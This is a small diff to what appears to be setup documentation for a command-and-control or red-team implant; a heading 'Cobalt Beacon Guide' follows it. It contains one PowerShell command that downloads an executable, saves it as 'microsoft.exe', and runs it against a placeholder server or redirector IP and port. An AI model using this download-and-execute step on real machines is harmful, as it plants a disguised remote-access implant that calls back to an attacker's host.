@@ -42,7 +42,7 @@
 	- Host the windows executable on a HTTP server
 
 	- Run the following command on the client to download and execute:
-		"Invoke-WebRequest "hosted_exe" -OutFile microsoft.exe;.\microsoft.exe [server/redirector ip] [server/redirector port]" or do whatever you want
+		"Invoke-WebRequest "hosted_exe" -OutFile microsoft.exe;.\microsoft.exe [server/redirector ip] [server/redirector port]"
 
 # Cobalt Beacon Guide
 
